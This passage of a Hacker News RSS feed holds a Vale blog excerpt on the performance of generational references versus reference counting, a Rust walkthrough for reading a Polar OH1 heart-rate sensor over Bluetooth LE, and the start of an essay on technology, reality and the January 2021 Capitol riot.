<div id="note9" data-noteid="9">
<p><span>9</span></p><section>
<p>
 We used the <a href="https://github.com/ValeLang/Vale/tree/master/benchmarks/BenchmarkRL/vale">BenchmarkRL</a> terrain generator to gather these numbers, with different values for the <span>--region-override</span> flag: <span>unsafe-fast</span>, <span>naive-rc</span>, and <span>resilient-v3</span> respectively.
</p>

</section>
</div>
<div id="note10" data-noteid="10">
<p><span>10</span></p><section>
<p>
 Here, we benchmarked against other flavors of Vale, to isolate the differences between unsafe, reference-counting, and generational references.
</p>
<p>
Once we implement full hybrid-generational memory, we'll be benchmarking against C++ and Rust, stay tuned!

</p>

</section>
</div>

        </div>
      </div>
    
</div>

    </div>
    <div>
      <div>
  
<section>
<p>
Generational references have only 10.84% overhead, <b>less than half the cost of reference counting!</b> These are very promising results, and suggest that full hybrid-generational memory could be incredibly fast.
</p>

</section>
<section>
<p>
Try it out! In the Vale release, you can find a benchmark folder with scripts to run the benchmarks. You can find the source code for the various approaches <a href="https://github.com/ValeLang/Vale/tree/master/Midas/src/c-compiler/region">here</a> (feel free to swing by the <a href="https://discord.gg/SNB8yGH">discord server</a> and we can point you to the right files).
</p>

</section>

      </div>
  


    </div>
    <div>
      <div>
  
<section>
<p>
<b>Note these caveats!</b> To isolate the difference between generational references and the other approaches:
</p>
<ul>
<li>
In all flavors, we only allocate objects on the heap, except for primitives. Future versions will add stack allocations.
</li>
<li>
We used <a href="https://github.com/ValeLang/Vale/blob/master/Midas/src/builtins/genHeap.c">genHeap.c</a> for all versions, though only GM ever touches the generation number, the other versions ignore it. Future versions will integrate generational malloc into jemalloc or mimalloc directly.
</li>
</ul>
<p>
Once we address these limitations, we can get more precise benchmarks against the other approaches.
</p>

</section>

      </div>
  


    </div>
    <div>
      <div>
  
<section>
<h2 id="why-is-this-so-fast">
 Why is this so fast?</h2>

</section>
<section>
<p>
Generational references are much easier for the CPU to handle than reference-counted references, because:
</p>
<ul>
<li>
Generational references have no aliasing/dealiasing overhead, just on dereference.
</li>
<li>
Generational references cause less cache misses.
</li>
<li>
Liveness checks' branching is easier to predict than RC decrements' branching.
</li>
</ul>

</section>
<section>
<p>
We explain these two differences more below.
</p>

</section>

      </div>
  


    </div>
    <div>
      <div>
  
<section>
<h3 id="no-aliasing-costs">
 No Aliasing Costs</h3>

</section>
<section>
<p>
Reference counting is costly:
</p>
<ul>
<li>
Whenever we "alias" (make a new reference to an object), we have to dereference the object to increment its counter.
</li>
<li>
Whenever we "dealias" (throw away a reference), we have to:
</li>
<ul>
<li>
Dereference the object to decrement its counter,
</li>
<li>
If the counter is zero, deallocate it.
</li>
</ul>
</ul>
<p>
For example:
</p>

    <div>
      
      <p><span><span>fn <span>launchShip</span><span>(<span><span><span>ships</span></span> <span>&amp;<span><span>Map</span>&lt;<span>int</span>, <span>&amp;<span>Spaceship</span></span>&gt;</span></span></span>, <span><span><span>id</span></span> <span>int</span></span>, <span><span><span>armada</span></span> <span>&amp;<span><span>List</span>&lt;<span>&amp;<span>Spaceship</span></span>&gt;</span></span></span>)</span> <span>{<br>  <span><span><span><span>ship</span></span></span> = <span><span>ships</span><span>.</span><span>get</span>(<span>id</span>)</span></span>;<br>    <p>  <span><span>armada</span><span>.</span><span>add</span>(<span>ship</span>)</span>;</p><p>  <br>  <br>  <br>  <br>  <br>  <br>}</p></span></span></span></p>
    </div>
  
<p>
As you can see, reference counting incurs a cost whenever we alias or dealias. <b>Generational references don't have that cost.</b> The above snippet would have zero overhead if it used generational references.
</p>

</section>

      </div>
  


    </div>
    <div>
      <div>
  
<section>
<p>
Instead, generational references incur a cost whenever we dereference an object:
</p>

    <div>
      
      <p><span><span>fn <span>getShipName</span><span>(<span><span><span>ships</span></span> <span>&amp;<span><span>Map</span>&lt;<span>int</span>, <span>&amp;<span>Spaceship</span></span>&gt;</span></span></span>, <span><span><span>id</span></span> <span>int</span></span>)</span> <span><span>str</span> </span><span>{<br>  <span><span><span><span>ship</span></span></span> = <span><span>ships</span><span>.</span><span>get</span>(<span>id</span>)</span></span>;<p>  <br>  <br>  <span>ret <span><span>ship</span><span>.</span><span>name</span></span>;</span><br>}</p></span></span></span></p>
    </div>
  

</section>
<section>
<p>
This is cheaper because <b>programs dereference less than they alias and dealias:</b> our sample program had 4.7 million counter adjustments, but only 1.3 million liveness checks. <a href="#note11" data-noteid="11">11</a> <a href="#note12" data-noteid="12">12</a>
</p>

</section>
<section>
<h3 id="more-cache-friendly">
 More Cache Friendly</h3>
<p>
Reference counting is not very "cache friendly". Adding and subtracting integers is basically free on modern CPUs, but the real bottleneck in modern programs is how <i>far</i> those integers are: if it's been recently accessed, it's in the nearby cache, and only takes a few CPU cycles to fetch. Otherwise the CPU will "cache miss" and have to bring it in all the way from RAM, which could take <b>hundreds</b> of cycles. <a href="#note13" data-noteid="13">13</a>
</p>
<p>
In our reference-counted <span>launchShip</span> example, the <span>ship.__ref_count++</span> could take a few cycles if <span>ship</span> is already in the cache, or hundreds of cycles if it's not.
</p>

</section>
<section>
<p>
Generational references are more cache friendly:
</p>
<ul>
<li>
When a generational reference goes away, we don't need to reach into memory (unlike RC, where we have to decrement a counter).
</li>
<li>
We don't need to increment when aliasing (see previous section); we don't need to reach into memory to increment.
</li>
</ul>

</section>

      </div>
  
<div>

      <div>
        <div>
    
<div id="note11" data-noteid="11">
<p><span>11</span></p><section>
<p>
 Half of these are aliasings and half are dealiasings. Aliasing happens whenever we access a member (e.g. <span>person.name</span>) or make a new reference (e.g. <span>&amp;person</span>).
</p>

</section>
</div>
<div id="note12" data-noteid="12">
<p><span>12</span></p><section>
<p>
 Many languages are able to skip a lot of the adjustments, using static analysis. For example, Lobster can remove up to 95%. Our experiment doesn't have those optimizations; it compares naive RC to naive generational references.
</p>

</section>
</div>


        </div>
      </div>
    
</div>

    </div>
    <div>
      <div>
  
<section>
<h3 id="better-branch-prediction">
 Better Branch Prediction</h3>
<p>
For a given if-statement, CPUs will predict whether we'll go down the "then" branch or the "else" branch. This is called …</p></section></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vale.dev/blog/generational-references">https://vale.dev/blog/generational-references</a></em></p>]]>
            </description>
            <link>https://vale.dev/blog/generational-references</link>
            <guid isPermaLink="false">hacker-news-small-sites-25701111</guid>
            <pubDate>Sat, 09 Jan 2021 15:31:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Next Gen Static Blogging]]>
            </title>
            <description>
<![CDATA[
Score 219 | Comments 168 (<a href="https://news.ycombinator.com/item?id=25701053">thread link</a>) | @mmackh
<br/>
January 9, 2021 | https://inoads.com/articles/2020-01-09-Next-Gen-Static-Blogging | <a href="https://web.archive.org/web/*/https://inoads.com/articles/2020-01-09-Next-Gen-Static-Blogging">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://inoads.com/articles/2020-01-09-Next-Gen-Static-Blogging</link>
            <guid isPermaLink="false">hacker-news-small-sites-25701053</guid>
            <pubDate>Sat, 09 Jan 2021 15:25:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Holiday Hacking – Tracking my heart rate while playing Call of Duty]]>
            </title>
            <description>
<![CDATA[
Score 74 | Comments 36 (<a href="https://news.ycombinator.com/item?id=25700872">thread link</a>) | @lukastyrychtr
<br/>
January 9, 2021 | https://jcdav.is/2021/01/04/Holiday-Hacking-COD-HR/ | <a href="https://web.archive.org/web/*/https://jcdav.is/2021/01/04/Holiday-Hacking-COD-HR/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
  
  <p><span>04 Jan 2021</span></p><p>Over the holidays, I got a <a href="https://www.polar.com/us-en/products/accessories/oh1-optical-heart-rate-sensor">Polar OH1+</a> as a Christmas present. Its an optical heart rate monitor with similar tech to those found in smart watches (including my Garmin running watch), but much more accurate (at least for running) due to being smaller &amp; lighter, as well as fitting against the fleshier upper arm:</p>

<p><img src="https://jcdav.is/public/oh1-small.jpg" alt="Polar OH1"></p>

<p>Like any modern gadget these days, it supports Bluetooth (specifically Bluetooth Low Energy, or BLE/BTLE) for talking to your phone and/or smart watch. Which got me wondering, will it pair with a computer?</p>

<p><img src="https://jcdav.is/public/bluetooth.jpg" alt="It pairs"></p>

<p>This piqued my curiosity. I had long been at least somewhat curious about tracking my heart rate while say playing video games, if nothing else for curiosity. So how easy is it to grab data from this thing? As with the last few years, I had spent a bit of December doing a bunch of <a href="https://adventofcode.com/">Advent of Code</a> in rust, only to forget and have to re-learn everything the next year. So figured I could maybe try my hand at a “real” project.</p>

<p>Some quick googling later, I found the promising-looking <a href="https://crates.io/crates/btleplug">btleplug</a> crate. Lets dump data from all nearby devices…</p>

<div><div><pre><code><span>extern</span> <span>crate</span> <span>btleplug</span><span>;</span>

<span>use</span> <span>std</span><span>::</span><span>thread</span><span>;</span>
<span>use</span> <span>std</span><span>::</span><span>time</span><span>::</span><span>Duration</span><span>;</span>

<span>#[cfg(target_os</span> <span>=</span> <span>"linux"</span><span>)]</span>
<span>use</span> <span>btleplug</span><span>::</span><span>bluez</span><span>::{</span><span>adapter</span><span>::</span><span>ConnectedAdapter</span><span>,</span> <span>manager</span><span>::</span><span>Manager</span><span>};</span>
<span>#[cfg(target_os</span> <span>=</span> <span>"windows"</span><span>)]</span>
<span>use</span> <span>btleplug</span><span>::</span><span>winrtble</span><span>::{</span><span>adapter</span><span>::</span><span>Adapter</span><span>,</span> <span>manager</span><span>::</span><span>Manager</span><span>};</span>
<span>#[cfg(target_os</span> <span>=</span> <span>"macos"</span><span>)]</span>
<span>use</span> <span>btleplug</span><span>::</span><span>corebluetooth</span><span>::{</span><span>adapter</span><span>::</span><span>Adapter</span><span>,</span> <span>manager</span><span>::</span><span>Manager</span><span>};</span>
<span>use</span> <span>btleplug</span><span>::</span><span>api</span><span>::{</span><span>UUID</span><span>,</span> <span>Central</span><span>,</span> <span>Peripheral</span><span>};</span>

<span>#[cfg(any(target_os</span> <span>=</span> <span>"windows"</span><span>,</span> <span>target_os</span> <span>=</span> <span>"macos"</span><span>))]</span>
<span>fn</span> <span>get_central</span><span>(</span><span>manager</span><span>:</span> <span>&amp;</span><span>Manager</span><span>)</span> <span>-&gt;</span> <span>Adapter</span> <span>{</span>
    <span>let</span> <span>adapters</span> <span>=</span> <span>manager</span><span>.adapters</span><span>()</span><span>.unwrap</span><span>();</span>
    <span>adapters</span><span>.into_iter</span><span>()</span><span>.nth</span><span>(</span><span>0</span><span>)</span><span>.unwrap</span><span>()</span>
<span>}</span>

<span>#[cfg(target_os</span> <span>=</span> <span>"linux"</span><span>)]</span>
<span>fn</span> <span>get_central</span><span>(</span><span>manager</span><span>:</span> <span>&amp;</span><span>Manager</span><span>)</span> <span>-&gt;</span> <span>ConnectedAdapter</span> <span>{</span>
    <span>let</span> <span>adapters</span> <span>=</span> <span>manager</span><span>.adapters</span><span>()</span><span>.unwrap</span><span>();</span>
    <span>let</span> <span>adapter</span> <span>=</span> <span>adapters</span><span>.into_iter</span><span>()</span><span>.nth</span><span>(</span><span>0</span><span>)</span><span>.unwrap</span><span>();</span>
    <span>adapter</span><span>.connect</span><span>()</span><span>.unwrap</span><span>()</span>
<span>}</span>

<span>fn</span> <span>main</span><span>()</span> <span>{</span>
    <span>let</span> <span>manager</span> <span>=</span> <span>Manager</span><span>::</span><span>new</span><span>()</span><span>.unwrap</span><span>();</span>
    <span>let</span> <span>central</span> <span>=</span> <span>get_central</span><span>(</span><span>&amp;</span><span>manager</span><span>);</span>

    <span>central</span><span>.start_scan</span><span>()</span><span>.unwrap</span><span>();</span>
    <span>thread</span><span>::</span><span>sleep</span><span>(</span><span>Duration</span><span>::</span><span>from_secs</span><span>(</span><span>2</span><span>));</span>

    <span>for</span> <span>per</span> <span>in</span> <span>&amp;</span><span>central</span><span>.peripherals</span><span>()</span> <span>{</span>
        <span>println!</span><span>(</span><span>"{:?}"</span><span>,</span> <span>per</span><span>);</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>(Note that though this part should work cross-platform, I couldn’t get bluetooth working from WSL, so this was all done natively on Windows).</p>

<p>Sure enough, among the shockingly large list of nearby devices is my new toy:</p>

<div><div><pre><code>A0:9E:1A:XX:XX:XX properties: PeripheralProperties { address: A0:9E:1A:XX:XX:XX, address_type: Public, local_name: Some("Polar OH1 XXXXXXXX"), tx_power_level: Some(-64), manufacturer_data: Some([]), discovery_count: 6, has_scan_response: true }, characteristics: {}
</code></pre></div></div>

<p>Let’s see what characteristics it supports:</p>

<div><div><pre><code>    <span>let</span> <span>ohr</span> <span>=</span> <span>central</span><span>.peripherals</span><span>()</span><span>.into_iter</span><span>()</span><span>.find</span><span>(|</span><span>p</span><span>|</span> <span>{</span>
        <span>p</span><span>.properties</span><span>()</span><span>.local_name</span><span>.map</span><span>(|</span><span>n</span><span>|</span> <span>n</span><span>.starts_with</span><span>(</span><span>"Polar OH1"</span><span>))</span>
            <span>.unwrap_or</span><span>(</span><span>false</span><span>)</span>
    <span>})</span><span>.unwrap</span><span>();</span>

    <span>ohr</span><span>.connect</span><span>();</span>
    <span>println!</span><span>(</span><span>"{:?}"</span><span>,</span> <span>ohr</span><span>.discover_characteristics</span><span>()</span><span>.unwrap</span><span>());</span>
</code></pre></div></div>

<p>Turns out..a lot?</p>

<div><div><pre><code>[Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: 00:00:2A:00:00:00:10:00:80:00:00:80:5F:9B:34:FB, properties: READ }, 
Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: 00:00:2A:01:00:00:10:00:80:00:00:80:5F:9B:34:FB, properties: READ }, 
Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: 00:00:2A:04:00:00:10:00:80:00:00:80:5F:9B:34:FB, properties: READ }, 
Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: 00:00:2A:A6:00:00:10:00:80:00:00:80:5F:9B:34:FB, properties: READ }, 
Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: 00:00:2A:05:00:00:10:00:80:00:00:80:5F:9B:34:FB, properties: INDICATE }, Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: 00:00:2A:29:00:00:10:00:80:00:00:80:5F:9B:34:FB, properties: READ }, 
Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: 00:00:2A:24:00:00:10:00:80:00:00:80:5F:9B:34:FB, properties: READ }, 
Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: 00:00:2A:25:00:00:10:00:80:00:00:80:5F:9B:34:FB, properties: READ }, 
Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: 00:00:2A:27:00:00:10:00:80:00:00:80:5F:9B:34:FB, properties: READ }, 
Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: 00:00:2A:26:00:00:10:00:80:00:00:80:5F:9B:34:FB, properties: READ }, 
Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: 00:00:2A:28:00:00:10:00:80:00:00:80:5F:9B:34:FB, properties: READ }, 
Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: 00:00:2A:23:00:00:10:00:80:00:00:80:5F:9B:34:FB, properties: READ }, 
Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: FB:00:5C:51:02:E7:F3:87:1C:AD:8A:CD:2D:8D:F0:C8, properties: WRITE_WITHOUT_RESPONSE | WRITE | NOTIFY },
Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: FB:00:5C:52:02:E7:F3:87:1C:AD:8A:CD:2D:8D:F0:C8, properties: NOTIFY }, 
Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: FB:00:5C:53:02:E7:F3:87:1C:AD:8A:CD:2D:8D:F0:C8, properties: WRITE_WITHOUT_RESPONSE | WRITE },
Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: 00:00:2A:37:00:00:10:00:80:00:00:80:5F:9B:34:FB, properties: NOTIFY }, 
Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: 00:00:2A:19:00:00:10:00:80:00:00:80:5F:9B:34:FB, properties: READ | NOTIFY }, 
Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: FB:00:5C:21:02:E7:F3:87:1C:AD:8A:CD:2D:8D:F0:C8, properties: READ }, 
Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: FB:00:5C:22:02:E7:F3:87:1C:AD:8A:CD:2D:8D:F0:C8, properties: WRITE | INDICATE }, Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: FB:00:5C:26:02:E7:F3:87:1C:AD:8A:CD:2D:8D:F0:C8, properties: NOTIFY }, 
Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: 62:17:FF:4C:C8:EC:B1:FB:13:80:3A:D9:86:70:8E:2D, properties: READ }, 
Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: 62:17:FF:4D:91:BB:91:D0:7E:2A:7C:D3:BD:A8:A1:F3, properties: WRITE | INDICATE }, Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: FB:00:5C:81:02:E7:F3:87:1C:AD:8A:CD:2D:8D:F0:C8, properties: READ | WRITE | INDICATE }, Characteristic { start_handle: 0, end_handle: 0, value_handle: 0, uuid: FB:00:5C:82:02:E7:F3:87:1C:AD:8A:CD:2D:8D:F0:C8, properties: NOTIFY }]
</code></pre></div></div>

<p>Which of these do I want? The <a href="https://btprodspecificationrefs.blob.core.windows.net/assigned-values/16-bit%20UUID%20Numbers%20Document.pdf">Bluetooth UUID specifications</a> lists a bunch of different potentially interesting IDs, but they are all 16 bits, whereas are 128 bit. Making matters more confusing, <code>btleplug</code> ‘s UUID definition seems to allow for either:</p>

<div><div><pre><code><span>pub</span> <span>enum</span> <span>UUID</span> <span>{</span>
    <span>B16</span><span>(</span><span>u16</span><span>),</span>
    <span>B128</span><span>([</span><span>u8</span><span>;</span> <span>16</span><span>]),</span>
<span>}</span>
</code></pre></div></div>

<p>However it seems like a lot of them seem to only differ in the 3rd and 4th bytes <sup><a href="#suff1">1</a></sup>, and those to roughly correspond to GATT Characteristic Ids, and in there is a <code>2A:37</code>, which represents Heart Rate Measurement - sounds promising. Lets see if we can listen &amp; dump that data:</p>

<div><div><pre><code>    <span>let</span> <span>mut</span> <span>bytes</span><span>:</span> <span>[</span><span>u8</span><span>;</span> <span>16</span><span>]</span> <span>=</span> <span>[</span><span>0x00</span><span>,</span><span>0x00</span><span>,</span><span>0x2A</span><span>,</span><span>0x37</span><span>,</span><span>0x00</span><span>,</span><span>0x00</span><span>,</span><span>0x10</span><span>,</span><span>0x00</span><span>,</span><span>0x80</span><span>,</span><span>0x00</span><span>,</span><span>0x00</span><span>,</span><span>0x80</span><span>,</span><span>0x5F</span><span>,</span><span>0x9B</span><span>,</span><span>0x34</span><span>,</span><span>0xFB</span><span>];</span>
    <span>bytes</span><span>.reverse</span><span>();</span>
    <span>let</span> <span>uuid</span> <span>=</span> <span>UUID</span><span>::</span><span>B128</span><span>(</span><span>bytes</span><span>);</span>
    <span>let</span> <span>chars</span> <span>=</span> <span>ohr</span><span>.discover_characteristics</span><span>()</span>
        <span>.expect</span><span>(</span><span>"Couldn't discover characteristics"</span><span>);</span>
    <span>let</span> <span>hr_char</span> <span>=</span> <span>chars</span><span>.iter</span><span>()</span><span>.find</span><span>(|</span><span>c</span><span>|</span> <span>c</span><span>.uuid</span> <span>==</span> <span>uuid</span><span>)</span>
        <span>.expect</span><span>(</span><span>"couldn't find HR characteristic"</span><span>);</span>

    <span>ohr</span><span>.on_notification</span><span>(</span><span>Box</span><span>::</span><span>new</span><span>(|</span><span>not</span><span>|</span> <span>{</span>
        <span>println!</span><span>(</span><span>"{:?}"</span><span>,</span> <span>not</span><span>.value</span><span>);</span>
    <span>}));</span>
    <span>ohr</span><span>.subscribe</span><span>(</span><span>hr_char</span><span>)</span><span>.expect</span><span>(</span><span>"Couldn't subscribe"</span><span>);</span>
    <span>loop</span> <span>{</span>
    <span>}</span>
</code></pre></div></div>

<p>Endianness issues out of the way this….seems to be working?</p>

<div><div><pre><code>C:\Users\jackson\Dev\hroverlay&gt;cargo run
    Finished dev [unoptimized + debuginfo] target(s) in 0.14s
     Running `target\debug\hroverlay.exe`
[0, 59]
[0, 58]
[0, 58]
[0, 59]
[0, 60]
[0, 61]
[0, 62]
</code></pre></div></div>

<p>At least that second number sure looks like a heart rate reading. To confirm this, I hopped over to the technical specifications for the Heart Rate Service (downloadable <a href="https://www.bluetooth.com/specifications/gatt/">here</a>). Sure enough, byte 0 represents various flags and byte 1 is a heart rate measurement. The spec authors have even figured out support for heart rates &gt;255 on off chance you ever slap one of these bad boys on a hummingbird:</p>

<blockquote>
  <p>3.1.1.2Heart Rate Measurement Value Field</p>

  <p>The Heart Rate Measurement Value field shall be included in the Heart Rate Measurement characteristic. While most human applications require support for only 255 bpm or less, special applications (e.g. animals) may require support for higher bpm values. If the Heart Rate Measurement Value is less than or equal to 255 bpm a UINT8 format should be used for power savings. If the Heart Rate Measurement Value exceeds 255 bpm a UINT16 format shall be used. See 3.1.1.1.1for additional requirements on the Heart Rate Value format change.</p>
</blockquote>

<p>Other potentially interesting bit flags include a way to indicate if the sensor thinks it has lost skin contact.</p>

<h2 id="displaying-things">Displaying things</h2>

<p>Now its time to figure out a UI. Faced with a <a href="https://www.areweguiyet.com/">large number of different options</a>, I ended up settling on the not-even-listed-there <a href="https://crates.io/crates/native-windows-gui">native-windows-gui crate</a> , throwing cross-platform support into the wind on the suspicion I would need easy access to the underlying win32 APIs, since it is largely just a series of nice convenience abstractions over those. Using the associated native-windows-derive macro crate, I had a basic UI setup working fairly quickly:</p>

<div><div><pre><code><span>#[derive(Default,</span> <span>NwgUi)]</span>
<span>pub</span> <span>struct</span> <span>BasicApp</span> <span>{</span>
    <span>#[nwg_control(size:</span> <span>(</span><span>300</span><span>,</span> <span>115</span><span>),</span> <span>flags:</span> <span>"WINDOW|VISIBLE"</span><span>)]</span>
    <span>#[nwg_events(OnWindowClose:</span> <span>[</span><span>BasicApp::exit]</span><span>)]</span>
    <span>window</span><span>:</span> <span>nwg</span><span>::</span><span>Window</span><span>,</span>

    <span>#[nwg_layout(parent:</span> <span>window)]</span>
    <span>grid</span><span>:</span> <span>nwg</span><span>::</span><span>GridLayout</span><span>,</span>

    <span>#[nwg_control(text:</span> <span>"--"</span><span>,</span> <span>readonly:</span> <span>true</span><span>)]</span>
    <span>#[nwg_layout_item(layout:</span> <span>grid,</span> <span>row:</span> <span>0</span><span>,</span> <span>col:</span> <span>0</span><span>)]</span>
    <span>hr</span><span>:</span> <span>nwg</span><span>::</span><span>TextInput</span><span>,</span>

    <span>#[nwg_control(parent:</span> <span>window,</span> <span>interval:</span> <span>500</span><span>,</span> <span>stopped:</span> <span>false</span><span>)]</span>
    <span>#[nwg_events(OnTimerTick:</span> <span>[</span><span>BasicApp::draw_hr]</span><span>)]</span>
    <span>timer</span><span>:</span> <span>nwg</span><span>::</span><span>Timer</span><span>,</span>
<span>}</span>

<span>impl</span> <span>BasicA…</span></code></pre></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jcdav.is/2021/01/04/Holiday-Hacking-COD-HR/">https://jcdav.is/2021/01/04/Holiday-Hacking-COD-HR/</a></em></p>]]>
            </description>
            <link>https://jcdav.is/2021/01/04/Holiday-Hacking-COD-HR/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25700872</guid>
            <pubDate>Sat, 09 Jan 2021 15:03:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We Have a Reality Problem]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25700603">thread link</a>) | @sgwil
<br/>
January 9, 2021 | https://www.chrbutler.com/we-have-a-reality-problem | <a href="https://web.archive.org/web/*/https://www.chrbutler.com/we-have-a-reality-problem">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>



<p>
In the early 1990s, when the internet was still in its structural infancy, and its influence on broader culture was widely underestimated if not entirely unknown, Howard Rheingold already knew enough to predict where this newest technology would — and wouldn’t — take us.
</p>
<p>
These lines from Rheingold’s nearly thirty-year-old book, The Virtual Community, have been on my mind for over a decade:
</p>
<blockquote>
“What does it mean that the same hopes, described in the same words, for a decentralization of power, a deeper and more widespread citizen involvement in matters of state, a great equalizer for ordinary citizens to counter the forces of central control, have been voiced in the popular press for two centuries in reference to steam, electricity, and television? We’ve had enough time to live with steam, electricity, and television to recognize that they did indeed change the world, and to recognize that the utopia of technological millenarians has not yet materialized. An entire worldview and sales job are packed into the word progress, which links the notion of improvement with the notion of innovation, highlights the benefits of innovation while hiding the toxic side-effects of extractive and lucrative technologies, and then sells more of it to people via television as a cure for the stress of living in a technology-dominated world. The hope that the next technology will solve the problems created by the way the last technology was used is a kind of millennial, even messianic, hope, apparently ever-latent in the breasts of the citizenry. The myth of technological progress emerged out of the same Age of Reason that gave us the myth of representative democracy, a new organizing vision that still works pretty well, despite the decline in vigor of the old democratic institutions. It’s hard to give up on one Enlightenment ideal while clinging to another.” — Howard Rheingold, <a href="http://www.rheingold.com/vc/book/" target="_blank">The Virtual Community</a>
</blockquote>
<p>
When I say I’ve been thinking about this passage for over a decade, I mean that literally. <a href="https://www.chrbutler.com/ethical-technology-3">Ten years ago</a>, I reflected upon how Rheingold’s perspective had aged after, then, almost two decades. What stood out to me in 2011 was his connection between progress and economics. I noted that ideas of progress are carried by economic activity, which means that ideas that don’t easily bind to wealth-building don’t easily bind to culture. Or in other words, capitalism promotes technological change more than technology changes capitalism. That is not a good thing. And, it was as true ten years ago as it is today.
</p>
<p>
What strikes me now is how that same idea plays out within a much more developed technological culture. In 1993, Rheingold’s assessment would have probably struck the average person as <i>academic</i>. Intellectually persuasive, perhaps, but not especially relevant to day-to-day life. After all, in the year Rheingold’s book was published, there were an estimated 15 million internet users <i>worldwide</i>. That was less than half of one percent of the world’s population. Back then, they measured internet usage by file requests — that alone tells you a lot. But to be specific, those file requests had increased to an average of 400,000 a month. Total. In case you’re not sure, that is not a big number by today’s standards. It’s tiny. Today, there’d be as much point in measuring the internet in file requests as there would be in measuring a life in blinks.
</p>
<p><span>
1993</span> also happened to be the same year that the New York Times published <a href="https://www.nytimes.com/1993/12/08/business/business-technology-a-free-and-simple-computer-link.html?pagewanted=all&amp;src=pm" target="_blank">its very first story on the World Wide Web</a>! In it, Mitch Kapor (the creator of Lotus), offered this somewhat ironic quote: “For me Mosaic was a turning point. It’s like C-Span for everyone.” C-Span, of course, is “famous” for providing every American with unfettered access to governmental proceedings or, in other words, revealing how boring running a country can be.
</p>
<p>
That’s where Rheingold’s thirty-year-old assessment of the internet takes me now. We have gorged at the table of technology for long enough to be bored by even the notion of a new technological layer, but our addict’s muscle memory has us loading up our plates still. We understand the connection between technology and economy — now better than ever — and yet we see bizarre signs of dissonance everywhere. The person who virtue signals about one thing while keeping the other technological conveniences they enjoy — the ones that put neighbors out of work, fatten oligarchs, and erode meaningful boundaries throughout the world — very much in their blind spot. The person who rants about tearing down the system on a video recorded, processed, and uploaded to the system. The person who rebels against the government and shares the pictures of them doing it.
</p>
<p>
Unlike the tea party of 1773, where a hundred men dumped £9,659 worth of tea overnight so the city would wake up (literally) to see the symbol of their discontent floating in the harbor, 2021’s sedition was performed for a rapt audience in real time, with a tatooed QAnon shaman draped in animal pelts ransacking and shit-smearing the Capitol alongside wealthy Instagram influencers who flew in for the spree on their private jet. Whether they saw the rebellion as a historical act of defiance or just another batch of content for the feed is not so easy to parse. There is evidently a pretty wide and messy spectrum of participation, with those who drove in vans full of explosives, ready to zip-tie hostages and execute the Vice President on one end, and those who loitered nearby while flooding the internet with the same-old <span>MAGA</span> hat kissieface selfies on the other. And <i>somewhere</i> in there are the people who went to the trouble of printing up “Civil War” hoodies, the people who erected a massive cross and a gallows — a truly spectacular unforced error of irony — and sadly, the people who died in the brawl.
</p>
<p>
Who was rebelling and who was vlogging? Legally, it doesn’t really matter. They were one and the same this week. But when we place this moment within the longer narrative of culture, progress, and technology, I think it does and will matter quite a bit.
</p>
<p>
Rheingold lamented the common hope (“ever-latent in the breasts of the citizenry”) that technology will solve past problems without creating new ones. Of course it can’t do that. And in some respects, new problems signal progress as much as new solutions do. But when I re-read his words — “ever-latent in the breasts of the citizenry” — I think not of a hidden, concealed, existing-but-not-yet-manifest <i>hope</i>, but a hidden, concealed, existing-but-not-yet-manifest <i>reality</i> made possible by thirty years of the internet. And not just one latent reality, but as many of them as there are people who express them and agree. A clustering of <span>ID</span> and ego-born realities legitimized by the shine of a technological package and the easy endorsement of a like or share.
</p>
<p>
I wonder what sorts of defenses will be mounted in courts on behalf of the YouTubers, Twitchers, and Instagrammers who stormed the Capitol. Will it be that they didn’t know that what they were doing was wrong? That they didn’t know they were committing treason and not just creating content? Or will it be that they actually were not able to know the difference? As far-fetched as insanity pleas typically are, I wonder about future defenses that the increasing density of our filter bubbles may afford. Time will tell.
</p>
<p>
The internet has been the object of every kind of criticism and blame you can imagine. Certain corners of it more so than others. Sometimes the complaint has been that the technology gives voice to the profane. Sometimes it’s that the technology worsens inequality. Sometimes it’s our humanity we are worried about, and how using technology rewires our brains in the image of the machine. All these have had their time in the critical conversation. But what of the role technology has in simulating a reality within a reality? When it does this, it does it <i>invisibly</i> — wrapping itself around a person — without an edge or boundary that anyone can see or trace. These simulated realities create and shape minds just as the outer — the real — reality does.
</p>
<p>
